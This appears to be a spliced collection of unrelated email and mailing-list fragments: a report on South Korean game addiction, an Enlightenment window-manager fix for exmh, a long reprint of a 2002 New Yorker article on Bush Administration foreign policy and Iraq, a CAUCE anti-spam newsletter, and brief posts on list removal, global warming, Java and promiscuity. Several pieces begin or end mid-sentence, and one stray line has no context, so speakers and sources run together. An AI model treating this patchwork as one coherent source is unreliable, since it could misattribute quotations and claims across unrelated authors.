 to one recent study. Critics say the burgeoning industry is creating
 millions of zombified addicts who are turning on and tuning into computer
 games, and dropping out of school and traditional group activities, becoming
 uncommunicative and even violent because of the electronic games they play.
 
 ""Game players don't have normal social relationships anymore,"" said Kim Hyun
 Soo, a 36-year-old psychiatrist who is chairman of the Net Addiction
 Treatment Center, one of many groups that have sprung up to cope with
 Internet game addiction. ""Young people are losing the ability to relate to
 others, except through games. People who become addicted are prone to
 violence, even when they are not playing.

 	As Hal noted, I like to have the unseen window visible in all
 virtual desktops, even if the main window is minimized. However, I looked
 through ALL the preferences menus, and didn't see anything resembling ""Show

 (I'm running v2.4 - 06/23/2000 - Creaky, I know.)
 
 	I went into twm with no virtual desktops, and it came up just fine.
 Going back to Enlightenment I saw the same behavior as before. Then I knew
 it MUST be something in the window manager, so I went digging. in my

 settings that E. uses for remembering border styles, positions, shaded

 	I have a 1600x1200 screen, and it kept putting my window at
 1655x150 (AND had it shaded to boot, so it was tiny as well as offscreen!)
 	Searching for 'unseen' in that file found this section:

 restarted Enlightenment (CTRL-ALT-End) and then restarted exmh. Bingo!
 There was my window! 
 
 	I quickly told Englightenment to forget everything about that

 CLASS: Exmh
 NEW: unseen.UnseenWin
 NAME: unseen
 CLASS: UnseenWin
 BORDER: PAGER_LEFT_BLUE
 
 	Completely an Enlightenment problem, not exmh. (Though I wonder how
 it got mixed up in the first place? I certainly can't move a window off

 The New Yorker
 
 THE NEXT WORLD ORDER
 by NICHOLAS LEMANN
 The Bush Administration may have a brand-new doctrine of power.
 Issue of 2002-04-01
 Posted 2002-03-25
 
 When there is a change of command-and not just in government-the new people
 often persuade themselves that the old people were much worse than anyone
 suspected. This feeling seems especially intense in the Bush
 Administration, perhaps because Bill Clinton has been bracketed by a
 father-son team. It's easy for people in the Administration to believe
 that, after an unfortunate eight-year interlude, the Bush family has
 resumed its governance-and about time, too.
 
 The Bush Administration's sense that the Clinton years were a waste, or
 worse, is strongest in the realms of foreign policy and military affairs.
 Republicans tend to regard Democrats as untrustworthy in defense and
 foreign policy, anyway, in ways that coincide with what people think of as
 Clinton's weak points: an eagerness to please, a lack of discipline.
 Condoleezza Rice, Bush's national-security adviser, wrote an article in
 Foreign Affairs two years ago in which she contemptuously accused Clinton
 of ""an extraordinary neglect of the fiduciary responsibilities of the
 commander in chief."" Most of the top figures in foreign affairs in this
 Administration also served under the President's father. They took office
 last year, after what they regard as eight years of small-time flyswatting
 by Clinton, thinking that they were picking up where they'd left off.
 
 Not long ago, I had lunch with-sorry!-a senior Administration
 foreign-policy official, at a restaurant in Washington called the Oval
 Room. Early in the lunch, he handed me a twenty-seven- page report, whose
 cover bore the seal of the Department of Defense, an outline map of the
 world, and these words:
 
 Defense Strategy for the 1990s:
 The Regional Defense Strategy
 Secretary of Defense
 Dick Cheney
 January 1993
 
 One of the difficulties of working at the highest level of government is
 communicating its drama. Actors, professional athletes, and even elected
 politicians train for years, go through a great winnowing, and then perform
 publicly. People who have titles like Deputy Assistant Secretary of Defense
 are just as ambitious and competitive, have worked just as long and hard,
 and are often playing for even higher stakes-but what they do all day is go
 to meetings and write memos and prepare briefings. How, possibly, to
 explain that some of the documents, including the report that the senior
 official handed me, which was physically indistinguishable from a
 high-school term paper, represent the government version of playing
 Carnegie Hall?
 
 After the fall of the Berlin Wall, Dick Cheney, then the Secretary of
 Defense, set up a ""shop,"" as they say, to think about American foreign
 policy after the Cold War, at the grand strategic level. The project, whose
 existence was kept quiet, included people who are now back in the game, at
 a higher level: among them, Paul Wolfowitz, the Deputy Secretary of
 Defense; Lewis Libby, Cheney's chief of staff; and Eric Edelman, a senior
 foreign-policy adviser to Cheney-generally speaking, a cohesive group of
 conservatives who regard themselves as bigger-thinking, tougher-minded, and
 intellectually bolder than most other people in Washington. (Donald
 Rumsfeld, the Secretary of Defense, shares these characteristics, and has
 been closely associated with Cheney for more than thirty years.) Colin
 Powell, then the chairman of the Joint Chiefs of Staff, mounted a
 competing, and presumably more ideologically moderate, effort to reimagine
 American foreign policy and defense. A date was set-May 21, 1990-on which
 each team would brief Cheney for an hour; Cheney would then brief President
 Bush, after which Bush would make a foreign-policy address unveiling the
 new grand strategy.
 
 Everybody worked for months on the ""five-twenty-one brief,"" with a sense
 that the shape of the post-Cold War world was at stake. When Wolfowitz and
 Powell arrived at Cheney's office on May 21st, Wolfowitz went first, but
 his briefing lasted far beyond the allotted hour, and Cheney (a hawk who,
 perhaps, liked what he was hearing) did not call time on him. Powell didn't
 get to present his alternate version of the future of the United States in
 the world until a couple of weeks later. Cheney briefed President Bush,
 using material mostly from Wolfowitz, and Bush prepared his major
 foreign-policy address. But he delivered it on August 2, 1990, the day that
 Iraq invaded Kuwait, so nobody noticed.
 
 The team kept working. In 1992, the Times got its hands on a version of the
 material, and published a front-page story saying that the Pentagon
 envisioned a future in which the United States could, and should, prevent
 any other nation or alliance from becoming a great power. A few weeks of
 controversy ensued about the Bush Administration's hawks being
 ""unilateral""-controversy that Cheney's people put an end to with denials
 and the counter-leak of an edited, softer version of the same material.
 
 As it became apparent that Bush was going to lose to Clinton, the Cheney
 team's efforts took on the quality of a parting shot. The report that the
 senior official handed me at lunch had been issued only a few days before
 Clinton took office. It is a somewhat bland, opaque document-a ""scrubbed,""
 meaning unclassified, version of something more candid-but it contained the
 essential ideas of ""shaping,"" rather than reacting to, the rest of the
 world, and of preventing the rise of other superpowers. Its tone is one of
 skepticism about diplomatic partnerships. A more forthright version of the
 same ideas can be found in a short book titled ""From Containment to Global
 Leadership?,"" which Zalmay Khalilzad, who joined Cheney's team in 1991 and
 is now special envoy to Afghanistan, published a couple of years into the
 Clinton Administration, when he was out of government. It recommends that
 the United States ""preclude the rise of another global rival for the
 indefinite future."" Khalilzad writes, ""It is a vital U.S. interest to
 preclude such a development-i.e., to be willing to use force if necessary
 for the purpose.""
 
 When George W. Bush was campaigning for President, he and the people around
 him didn't seem to be proposing a great doctrinal shift, along the lines of
 the policy of containment of the Soviet Union's sphere of influence which
 the United States maintained during the Cold War. In his first major
 foreign-policy speech, delivered in November of 1999, Bush declared that ""a
 President must be a clear-eyed realist,"" a formulation that seems to
 connote an absence of world-remaking ambition. ""Realism"" is exactly the
 foreign-policy doctrine that Cheney's Pentagon team rejected, partly
 because it posits the impossibility of any one country's ever dominating
 world affairs for any length of time.
 
 One gets many reminders in Washington these days of how much the terrorist
 attacks of September 11th have changed official foreign-policy thinking.
 Any chief executive, of either party, would probably have done what Bush
 has done so far-made war on the Taliban and Al Qaeda and enhanced domestic
 security. It is only now, six months after the attacks, that we are truly
 entering the realm of Presidential choice, and all indications are that
 Bush is going to use September 11th as the occasion to launch a new,
 aggressive American foreign policy that would represent a broad change in
 direction rather than a specific war on terrorism. All his rhetoric,
 especially in the two addresses he has given to joint sessions of Congress
 since September 11th, and all the information about his state of mind which
 his aides have leaked, indicate that he sees this as the nation's moment of
 destiny-a perception that the people around him seem to be encouraging,
 because it enhances Bush's stature and opens the way to more assertive
 policymaking.
 
 Inside government, the reason September 11th appears to have been ""a
 transformative moment,"" as the senior official I had lunch with put it, is
 not so much that it revealed the existence of a threat of which officials
 had previously been unaware as that it drastically reduced the American
 public's usual resistance to American military involvement overseas, at
 least for a while. The Clinton Administration, beginning with the ""Black
 Hawk Down"" operation in Mogadishu, during its first year, operated on the
 conviction that Americans were highly averse to casualties; the all-bombing
 Kosovo operation, in Clinton's next-to-last year, was the ideal foreign
 military adventure. Now that the United States has been attacked, the
 options are much broader. The senior official approvingly mentioned a 1999
 study of casualty aversion by the Triangle Institute for Security Studies,
 which argued that the ""mass public"" is much less casualty-averse than the
 military or the civilian lite believes; for example, the study showed that
 the public would tolerate thirty thousand deaths in a military operation to
 prevent Iraq from acquiring weapons of mass destruction. (The American
 death total in the Vietnam War was about fifty-eight thousand.) September
 11th presumably reduced casualty aversion even further.
 
 Recently, I went to the White House to interview Condoleezza Rice. Rice's
 Foreign Affairs article from 2000 begins with this declaration: ""The United
 States has found it exceedingly difficult to define its 'national interest'
 in the absence of Soviet power."" I asked her whether that is still the
 case. ""I think the difficulty has passed in defining a role,"" she said
 immediately. ""I think September 11th was one of those great earthquakes
 that clarify and sharpen. Events are in much sharper relief."" Like Bush,
 she said that opposing terrorism and preventing the accumulation of weapons
 of mass destruction ""in the hands of irresponsible states"" now define the
 national interest. (The latter goal, by the way, is new-in Bush's speech to
 Congress on September 20th, America's sole grand purpose was ending
 terrorism.) We talked in her West Wing office; its tall windows face the
 part of the White House grounds where television reporters do their
 standups. In her bearing, Rice seemed less crisply military than she does
 in public. She looked a little tired, but she was projecting a kind of
 missionary calm, rather than belligerence.
 
 In the Foreign Affairs article, Rice came across as a classic realist,
 putting forth ""the notions of power politics, great powers, and power
 balances"" as the proper central concerns of the United States. Now she
 sounded as if she had moved closer to the one-power idea that Cheney's
 Pentagon team proposed ten years ago-or, at least, to the idea that the
 other great powers are now in harmony with the United States, because of
 the terrorist attacks, and can be induced to remain so. ""Theoretically, the
 realists would predict that when you have a great power like the United
 States it would not be long before you had other great powers rising to
 challenge it or trying to balance against it,"" Rice said. ""And I think what
 you're seeing is that there's at least a predilection this time to move to
 productive and coperative relations with the United States, rather than to
 try to balance the United States. I actually think that statecraft matters
 in how it all comes out. It's not all foreordained.""
 
 Rice said that she had called together the senior staff people of the
 National Security Council and asked them to think seriously about ""how do
 you capitalize on these opportunities"" to fundamentally change American
 doctrine, and the shape of the world, in the wake of September 11th. ""I
 really think this period is analogous to 1945 to 1947,"" she said-that is,
 the period when the containment doctrine took shape-""in that the events so
 clearly demonstrated that there is a big global threat, and that it's a big
 global threat to a lot of countries that you would not have normally
 thought of as being in the coalition. That has started shifting the
 tectonic plates in international politics. And it's important to try to
 seize on that and position American interests and institutions and all of
 that before they harden again.""
 
 The National Security Council is legally required to produce an annual
 document called the National Security Strategy, stating the over-all goals
 of American policy-another government report whose importance is great but
 not obvious. The Bush Administration did not produce one last year, as the
 Clinton Administration did not in its first year. Rice said that she is
 working on the report now.
 
 ""There are two ways to handle this document,"" she told me. ""One is to do it
 in a kind of minimalist way and just get it out. But it's our view that,
 since this is going to be the first one for the Bush Administration, it's
 important. An awful lot has happened since we started this process, prior
 to 9/11. I can't give you a certain date when it's going to be out, but I
 would think sometime this spring. And it's important that it be a real
 statement of what the Bush Administration sees as the strategic direction
 that it's going.""
 
 It seems clear already that Rice will set forth the hope of a more dominant
 American role in the world than she might have a couple of years ago. Some
 questions that don't appear to be settled yet, but are obviously being
 asked, are how much the United States is willing to operate alone in
 foreign affairs, and how much change it is willing to try to engender
 inside other countries-and to what end, and with what means. The leak a
 couple of weeks ago of a new American nuclear posture, adding offensive
 capability against ""rogue states,"" departed from decades of official
 adherence to a purely defensive position, and was just one indication of
 the scope of the reconsideration that is going on. Is the United States now
 in a position to be redrawing regional maps, especially in the Middle East,
 and replacing governments by force? Nobody thought that the Bush
 Administration would be thinking in such ambitious terms, but plainly it
 is, and with the internal debate to the right of where it was only a few
 months ago.
 
 Just before the 2000 election, a Republican foreign-policy figure suggested
 to me that a good indication of a Bush Administration's direction in
 foreign affairs would be who got a higher-ranking job, Paul Wolfowitz or
 Richard Haass. Haass is another veteran of the first Bush Administration,
 and an intellectual like Wolfowitz, but much more moderate. In 1997, he
 published a book titled ""The Reluctant Sheriff,"" in which he poked a little
 fun at Wolfowitz's famous strategy briefing of the early nineties (he
 called it the ""Pentagon Paper"") and disagreed with its idea that the United
 States should try to be the world's only great power over the long term.
 ""For better or worse, such a goal is beyond our reach,"" Haass wrote. ""It
 simply is not doable."" Elsewhere in the book, he disagreed with another of
 the Wolfowitz team's main ideas, that of the United States expanding the
 ""democratic zone of peace"": ""Primacy is not to be confused with hegemony.
 The United States cannot compel others to become more democratic."" Haass
 argued that the United States is becoming less dominant in the world, not
 more, and suggested ""a revival of what might be called traditional
 great-power politics.""
 
 Wolfowitz got a higher-ranking job than Haass: he is Deputy Secretary of
 Defense, and Haass is Director of Policy Planning for the State Department-
 in effect, Colin Powell's big-think guy. Recently, I went to see him in his
 office at the State Department. On the wall of his waiting room was an
 array of photographs of every past director of the policy-planning staff,
 beginning with George Kennan, the father of the containment doctrine and
 the first holder of the office that Haass now occupies.
 
 It's another indication of the way things are moving in Washington that
 Haass seems to have become more hawkish. I mentioned the title of his book.
 ""Using the word 'reluctant' was itself reflective of a period when foreign
 policy seemed secondary, and sacrificing for foreign policy was a hard case
 to make,"" he said. ""It was written when Bill Clinton was saying, 'It's the
 economy, stupid'-not 'It's the world, stupid.' Two things are very
 different now. One, the President has a much easier time making the case
 that foreign policy matters. Second, at the top of the national-security
 charts is this notion of weapons of mass destruction and terrorism.""
 
 I asked Haass whether there is a doctrine emerging that is as broad as
 Kennan's containment. ""I think there is,"" he said. ""What you're seeing from
 this Administration is the emergence of a new principle or body of
 ideas-I'm not sure it constitutes a doctrine-about what you might call the
 limits of sovereignty. Sovereignty entails obligations. One is not to
 massacre your own people. Another is not to support terrorism in any way.
 If a government fails to meet these obligations, then it forfeits some of
 the normal advantages of sovereignty, including the right to be left alone
 inside your own territory. Other governments, including the United States,
 gain the right to intervene. In the case of terrorism, this can even lead
 to a right of preventive, or peremptory, self-defense. You essentially can
 act in anticipation if you have grounds to think it's a question of when,
 and not if, you're going to be attacked.""
 
 Clearly, Haass was thinking of Iraq. ""I don't think the American public
 needs a lot of persuading about the evil that is Saddam Hussein,"" he said.
 ""Also, I'd fully expect the President and his chief lieutenants to make the
 case. Public opinion can be changed. We'd be able to make the case that
 this isn't a discretionary action but one done in self-defense.""
 
 On the larger issue of the American role in the world, Haass was still
 maintaining some distance from the hawks. He had made a speech not long
 before called ""Imperial America,"" but he told me that there is a big
 difference between imperial and imperialist. ""I just think that we have to
 be a little bit careful,"" he said. ""Great as our advantages are, there are
 still limits. We have to have allies. We can't impose our ideas on
 everyone. We don't want to be fighting wars alone, so we need others to
 join us. American leadership, yes; but not American unilateralism. It has
 to be multilateral. We can't win the war against terror alone. We can't
 send forces everywhere. It really does have to be a collaborative endeavor.""
 
 He stopped for a moment. ""Is there a successor idea to containment? I think
 there is,"" he said. ""It is the idea of integration. The goal of U.S.
 foreign policy should be to persuade the other major powers to sign on to
 certain key ideas as to how the world should operate: opposition to
 terrorism and weapons of mass destruction, support for free trade,
 democracy, markets. Integration is about locking them into these policies
 and then building institutions that lock them in even more.""
 
 The first, but by no means the last, obvious manifestation of a new
 American foreign policy will be the effort to remove Saddam Hussein. What
 the United States does in an Iraq operation will very likely dwarf what's
 been done so far in Afghanistan, both in terms of the scale of the
 operation itself and in terms of its aftermath.
 
 Several weeks ago, Ahmad Chalabi, the head of the Iraqi National Congress,
 the Iraqi opposition party, came through Washington with an entourage of
 his aides. Chalabi went to the State Department and the White House to ask,
 evidently successfully, for more American funding. His main public event
 was a panel discussion at the American Enterprise Institute. Chalabi's
 leading supporter in town, Richard Perle, the prominent hawk and former
 Defense Department official, acted as moderator. Smiling and supremely
 confident, Perle opened the discussion by saying, ""Evidence is mounting
 that the Administration is looking very carefully at strategies for dealing
 with Saddam Hussein."" The war on terrorism, he said, will not be complete
 ""until Saddam is successfully dealt with. And that means replacing his
 regime. . . . That action will be taken, I have no doubt.""
 
 Chalabi, who lives in London, is a charming, suave middle-aged man with a
 twinkle in his eye. He was dressed in a double-breasted pin-striped suit
 and a striped shirt with a white spread collar. Although he and his
 supporters argue that the Iraqi National Congress, with sufficient American
 support, can defeat Saddam just as the Northern Alliance defeated the
 Taliban in Afghanistan, this view hasn't won over most people in
 Washington. It isn't just that Chalabi doesn't look the part of a rebel
 military leader (""He could fight you for the last petit four on the tray
 over tea at the Savoy, but that's about it,"" one skeptical former Pentagon
 official told me), or that he isn't in Iraq. It's also that Saddam's
 military is perhaps ten times the size that the Taliban's was, and has been
 quite successful at putting down revolts over the last decade. The United
 States left Iraq in 1991 believing that Saddam might soon fall to an
 internal rebellion; Chalabi's supporters believe that Saddam is much weaker
 now, and that even signs that a serious operation was in the offing could
 finish him off. But non-true believers seem to be coming around to the idea
 that a military operation against Saddam would mean the deployment of
 anywhere from a hundred thousand to three hundred thousand American ground
 troops.
 
 Kenneth Pollack, a former C.I.A. analyst who was the National Security
 Council's staff expert on Iraq during the last years of the Clinton
 Administration, recently caused a stir in the foreign-policy world by
 publishing an article in Foreign Affairs calling for war against Saddam.
 This was noteworthy because three years ago Pollack and two co-authors
 published an article, also in Foreign Affairs, arguing that the Iraqi
 National Congress was incapable of defeating Saddam. Pollack still doesn't
 think Chalabi can do the job. He believes that it would require a
 substantial American ground, air, and sea force, closer in size to the one
 we used in Kuwait in 1990-91 than to the one we are using now in
 Afghanistan.
 
 Pollack, who is trim, quick, and crisp, is obviously a man who has given a
 briefing or two in his day. When I went to see him at his office in
 Washington, with a little encouragement he got out from behind his desk and
 walked over to his office wall, where three maps of the Middle East were
 hanging. ""The only way to do it is a full-scale invasion,"" he said, using a
 pen as a pointer. ""We're talking about two grand corps, two to three
 hundred thousand people altogether. The population is here, in the
 Tigris-Euphrates valley."" He pointed to the area between Baghdad and Basra.
 ""Ideally, you'd have the Saudis on board."" He pointed to the Prince Sultan
 airbase, near Riyadh. ""You could make Kuwait the base, but it's much easier
 in Saudi. You need to take western Iraq and southern Iraq""-pointing
 again-""because otherwise they'll fire Scuds at Israel and at the Saudi oil
 fields. You probably want to prevent Iraq from blowing up its own oil
 fields, so troops have to occupy them. And you need troops to defend the
 Kurds in northern Iraq."" Point, point. ""You go in as hard as you can, as
 fast as you can."" He slapped his hand on the top of his desk. ""You get the
 enemy to divide his forces, by threatening him in two places at once."" His
 hand hit the desk again, hard. ""Then you crush him."" Smack.
 
 That would be a reverberating blow. The United States has already removed
 the government of one country, Afghanistan, the new government is obviously
 shaky, and American military operations there are not completed. Pakistan,
 which before September 11th clearly met the new test of national
 unacceptability (it both harbors terrorists and has weapons of mass
 destruction), will also require long-term attention, since the country is
 not wholly under the control of the government, as the murder of Daniel
 Pearl demonstrated, and even parts of the government, like the intelligence
 service, may not be entirely under the control of the President. In Iraq,
 if America invades and brings down Saddam, a new government must be
 established-an enormous long-term task in a country where there is no
 obvious, plausible new leader. The prospective Iraq operation has drawn
 strong objections from the neighboring nations, one of which, Russia, is a
 nuclear superpower. An invasion would have a huge effect on the internal
 affairs of all the biggest Middle Eastern nations: Iran, Turkey, Saudi
 Arabia, and even Egypt. Events have forced the Administration to become
 directly involved in the Israeli-Palestinian conflict, as it hadn't wanted
 to do. So it's really the entire region that is in play, in much the way
 that Europe was immediately after the Second World War.
 
 In September, Bush rejected Paul Wolfowitz's recommendation of immediate
 moves against Iraq. That the President seems to have changed his mind is an
 indication, in part, of the bureaucratic skill of the Administration's
 conservatives. ""These guys are relentless,"" one former official, who is
 close to the high command at the State Department, told me. ""Resistance is
 futile."" The conservatives' other weapon, besides relentlessness, is
 intellectualism. Colin Powell tends to think case by case, and since
 September 11th the conservatives have outflanked him by producing at least
 the beginning of a coherent, hawkish world view whose acceptance
 practically requires invading Iraq. If the United States applies the
 doctrines of Cheney's old Pentagon team, ""shaping"" and expanding ""the zone
 of democracy,"" the implications would extend far beyond that one operation.
 
 The outside experts on the Middle East who have the most credibility with
 the Administration seem to be Bernard Lewis, of Princeton, and Fouad Ajami,
 of the Johns Hopkins School of Advanced International Studies, both of whom
 see the Arab Middle East as a region in need of radical remediation. Lewis
 was invited to the White House in December to brief the senior
 foreign-policy staff. ""One point he made is, Look, in that part of the
 world, nothing matters more than resolute will and force,"" the senior
 official I had lunch with told me-in other words, the United States needn't
 proceed gingerly for fear of inflaming the ""Arab street,"" as long as it is
 prepared to be strong. The senior official also recommended as interesting
 thinkers on the Middle East Charles Hill, of Yale, who in a recent essay
 declared, ""Every regime of the Arab-Islamic world has proved a failure,""
 and Reuel Marc Gerecht, of the American Enterprise Institute, who published
 an article in The Weekly Standard about the need for a change of regime in
 Iran and Syria. (Those goals, Gerecht told me when we spoke, could be
 accomplished through pressure short of an invasion.)
 
 Several people I spoke with predicted that most, or even all, of the
 nations that loudly oppose an invasion of Iraq would privately cheer it on,
 if they felt certain that this time the Americans were really going to
 finish the job. One purpose of Vice-President Cheney's recent diplomatic
 tour of the region was to offer assurances on that matter, while gamely
 absorbing all the public criticism of an Iraq operation. In any event, the
 Administration appears to be committed to acting forcefully in advance of
 the world's approval. When I spoke to Condoleezza Rice, she said that the
 United States should assemble ""coalitions of the willing"" to support its
 actions, rather than feel it has to work within the existing infrastructure
 of international treaties and organizations. An invasion of Iraq would test
 that policy in more ways than one: the Administration would be betting that
 it can continue to eliminate Al Qaeda cells in countries that publicly
 opposed the Iraq operation.
 
 When the Administration submitted its budget earlier this year, it asked
 for a forty-eight-billion-dollar increase in defense spending for fiscal
 2003, which begins in October, 2002. Much of that sum would go to improve
 military pay and benefits, but ten billion dollars of it is designated as
 an unspecified contingency fund for further operations in the war on
 terrorism. That's probably at least the initial funding for an invasion of
 Iraq.
 
 This spring, the Administration will be talking to other countries about
 the invasion, trying to secure basing and overflight privileges, while Bush
 builds up a rhetorical case for it by giving speeches about the
 unacceptability of developing weapons of mass destruction. A drama
 involving weapons inspections in Iraq will play itself out over the spring
 and summer, and will end with the United States declaring that the terms
 that Saddam offers for the inspections, involving delays and restrictions,
 are unacceptable. Then, probably in the late summer or early fall, the
 enormous troop positioning, which will take months, will begin. The
 Administration obviously feels confident that the United States can
 effectively parry whatever aggressive actions Saddam takes during the troop
 buildup, and hopes that its moves will destabilize Iraq enough to cause the
 Republican Guard, the military key to the country, to turn against Saddam
 and topple him on its own. But the chain of events leading inexorably to a
 full-scale American invasion, if it hasn't already begun, evidently will
 begin soon.
 
 Lewis (Scooter) Libby, who was the principal drafter of Cheney's
 future-of-the-world documents during the first Bush Administration, now
 works in an office in the Old Executive Office Building, overlooking the
 West Wing, where he has a second, smaller office. A packet of
 public-relations material prompted by the recent paperback publication of
 his 1996 novel, ""The Apprentice,"" quotes the Times' calling him ""Dick
 Cheney's Dick Cheney,"" which seems like an apt description: he appears
 absolutely sure of himself, and, whether by coincidence or as a result of
 the influence of his boss, speaks in a tough, confidential, gravelly
 rumble. Like Condoleezza Rice and Bush himself, he gives the impression of
 having calmly accepted the idea that the project of war and reconstruction
 which the Administration has now taken on may be a little exhausting for
 those charged with carrying it out but is unquestionably right, the only
 truly prudent course.
 
 When I went to see Libby, not long ago, I asked him whether, before
 September 11th, American policy toward terrorism should have been
 different. He went to his desk and got out a large black loose-leaf binder,
 filled with typewritten sheets interspersed with foldout maps of the Middle
 East. He looked through it for a long minute, formulating his answer.
 
 ""Let us stack it up,"" he said at last. ""Somalia, 1993; 1994, the discovery
 of the Al Qaeda-related plot in the Philippines; 1993, the World Trade
 Center, first bombing; 1993, the attempt to assassinate President Bush,
 former President Bush, and the lack of response to that, the lack of a
 serious response to that; 1995, the Riyadh bombing; 1996, the Khobar
 bombing; 1998, the Kenyan embassy bombing and the Tanzanian embassy
 bombing; 1999, the plot to launch millennium attacks; 2000, the bombing of
 the Cole. Throughout this period, infractions on inspections by the Iraqis,
 and eventually the withdrawal of the entire inspection regime; and the
 failure to respond significantly to Iraqi incursions in the Kurdish areas.
 No one would say these challenges posed easy problems, but if you take that
 long list and you ask, 'Did we respond in a way which discouraged people
 from supporting terrorist activities, or activities clearly against our
 interests? Did we help to shape the environment in a way which discouraged
 further aggressions against U.S. interests?,' many observers conclude no,
 and ask whether it was then easier for someone like Osama bin Laden to rise
 up and say credibly, 'The Americans don't have the stomach to defend
 themselves. They won't take casualties to defend their interests. They are
 morally weak.' ""
 
 Libby insisted that the American response to September 11th has not been
 standard or foreordained. ""Look at what the President has done in
 Afghanistan,"" he said, ""and look at his speech to the joint session of
 Congress""-meaning the State of the Union Message, in January. ""He made it
 clear that it's an important area. He made it clear that we believe in
 expanding the zone of democracy even in this difficult part of the world.
 He made it clear that we stand by our friends and defend our interests. And
 he had the courage to identify those states which present a problem, and to
 begin to build consensus for action that would need to be taken if there is
 not a change of behavior on their part. Take the Afghan case, for example.
 There are many other courses that the President could have taken. He could
 have waited for juridical proof before we responded. He could have engaged
 in long negotiations with the Taliban. He could have failed to seek a new
 relationship with Pakistan, based on its past nuclear tests, or been so
 afraid of weakening Pakistan that we didn't seek its help. This list could
 go on to twice or three times the length I've mentioned so far. But,
 instead, the President saw an opportunity to refashion relations while
 standing up for our interests. The problem is complex, and we don't know
 yet how it will end, but we have opened new prospects for relations not
 only with Afghanistan, as important as it was as a threat, but with the
 states of Central Asia, Pakistan, Russia, and, as it may develop, with the
 states of Southwest Asia more generally.""
 
 We moved on to Iraq, and the question of what makes Saddam Hussein
 unacceptable, in the Administration's eyes. ""The issue is not inspections,""
 Libby said. ""The issue is the Iraqis' promise not to have weapons of mass
 destruction, their promise to recognize the boundaries of Kuwait, their
 promise not to threaten other countries, and other promises that they made
 in '91, and a number of U.N. resolutions, including all the other problems
 I listed. Whether it was wise or not-and that is the subject of debate-Iraq
 was given a second chance to abide by international norms. It failed to
 take that chance then, and annually for the next ten years.""
 
 ""What's your level of confidence,"" I asked him, ""that the current regime
 will, in fact, change its behavior in a way that you will be satisfied by?""
 
 He ran his hand over his face and then gave me a direct gaze and spoke
 slowly and deliberately. ""There is no basis in Iraq's past behavior to have
 confidence in good-faith efforts on their part to change their behavior.""

 With most languages you parse the submitted form data and should come out

 * Progress of Senate anti-spam bill
 
 Over a year ago, Sen. Conrad Burns (R-MT) introduced S.630, the CAN
 SPAM Act of 2001. This bill would require UCE to have a valid return
 address to facilitate consumers' removal from spam lists. It would
 place enforcement in the hands of the Federal Trade Commission, and
 state Attorneys General. It would also permit Internet Service
 Providers (ISPs) to enforce violations, up to $10 per illegal spam.
 It would preempt any stricter state anti-spam laws.
 
 The Senate Commerce Committee considered the bill on May 17th, and
 reported it out largely unchanged.  It's not now scheduled for further
 action in the Senate.
 
 CAUCE has always opposed this bill, since we believe it would lead to
 more spam, not less.  When South Korea passed a similar opt-out law
 last year, spam from Korea soon increased by a factor of 10.
 
 Our April 2001 press release goes into more detail about the problems
 with S.630:
 
  http://www.cauce.org/pressreleases/pr-s630.shtml
 
 We're pleased that the Congress is looking at spam issues again, and
 hope that in the future we can help them create an effective bill that
 the entire Internet community can support.

 * European Union bans spam
 
 GLOBAL INTERNET COMMUNITY APPLAUDS EUROPEAN ANTI-SPAM VOTE
 
 May 31, 2002 - The Coalition Against Unsolicited Commercial E-Mail
 (CAUCE), EuroCAUCE, CAUCE India, CAUCE Canada and the Coalition Against
 Unsolicited Bulk E-Mail, Australia (CAUBE.au) today applauded the decision
 by the European Parliament to protect European Internet users from the
 practice of unsolicited e-mail advertisements. Yesterday's vote will turn
 Europe into a virtual ""spam-free zone"" after the formal adoption of the
 directive, making it illegal to send unsolicited e-mail, text message or
 other similar advertisements to individuals with whom companies do not
 have a preexisting business relationship.
 
 ""This is a tremendous day for European Internet users,"" said EuroCAUCE
 Chairman George Mills. ""We are extremely pleased that the European
 Parliament has listened to the citizens of its member countries and added
 the right to be left alone by spammers to its efforts to protect the
 privacy of Europeans.""
 
 While six European Union member countries had already formalized ""opt-in""
 in their national laws and regulations, yesterday's vote should turn all
 of Europe into a spam-free zone by the end of 2003.
 
 ""Unfortunately, the rest of the world's Internet-using countries,
 including the United States, now lag behind Europe in their protection
 of Internet users,"" said CAUCE Chairman Scott Hazen Mueller. ""This is
 a tremendous first step, but the rest of the world now needs to follow
 Europe's lead and unite behind protection of Internet users and
 network owners from abusive and costly unsolicited e-mail
 advertising.""
 
 ""This decision is the direct result of Internet users throughout the
 European Union standing up for their rights, and Members of the
 European Parliament listening to their constituents,"" said Mills. ""Our
 members and our volunteers performed an integral part of this process,
 translating, lobbying and educating their representatives.""
 
 More information on the E.U. directive is available on the European
 Parliament's Web site <http://www.europarl.eu.int/press/index_en.htm>,
 and a EuroCAUCE analysis is available at
 <http://www.euro.cauce.org/en/amendments1a.html>. More information on
 the international CAUCE network of affiliate organizations is

 No...the list has been on target i'd say about 95% of the time.
 Iff it starts being a problem, consider it. Right now, John's
 right - this remove thread is taking more time than any remove
 requests have in the entire past year.
 
 One thing you may want to consider (if feasible) - BugTraq's
 adopted a technique by which they add headers to each message
 indicating where to email to remove. The catch: the mail is
 not sent to ""majordomo"" - it is sent to ""listname-remove""@domain.
 I've found that useful when I can't remember exactly which mail
 addr I used to signup (since my email addr never shows up in
 a received message, and I have multiple addresses going to the
 same box).
 
 For all that, remember, even if you put the actual removal
 instructions right in the bottom of your email, you will
 _still_ get the clueless asking you how to remove. (Trust me,
 we've been there.)

 For anyone to fully bury global warming, they would need to explain why the
 dramatic increase in CO2 concentrations are not increasing the global
 temperature. They would also need to explain why, worldwide, glaciers are
 melting faster than they have previously in the historical record. That is,
 people need more than refutations, they need a compelling alternate
 explanation (hint: climate variability doesn't cover all the bases).

 The astounding thing about java is that despite all of the many significant 
 points in its favor, it still manages to suck, and break across JVMs.
 
 I was really looking forward to being able to use a better language like 
 java and get it compiled to real platform-specific binaries via the GNU 
 compiler collection.   But this seems to have never really gotten anywhere 
 because it would require porting or reimplementing libraries, which are 
 probably not source-available or tolerably licenced.   When I looked at 
 what I had to do to gcc and link ""hello world,"" I lost interest.
 
 Who the hell is writing the runtimes, anyway?   Why are Perl/Python/Ruby 
 more reliable?   In a world where the Macs all ran emulated 68K code 
 utterly reliably, it's just hard to accept that there can't be a single 
 portable JVM that just works.
 
 My opinion is biased because of the disgraceful state of non-Windoze 
 browser java implementations.

 You've redefined ""promiscuity"" above as ""total"" or ""average"" 
 activity, which seems to rob it of its common meaning: 
 activity above some specific threshold (usually ""one"") or 
 norm, or involving extra or indiscriminate variety. 
 ""Promiscuity"" is thus inherently a description of 
 distributions rather than averages.
 
 Consider a population of 3 males and 3 females. Let
 there be three pairings which result in each person
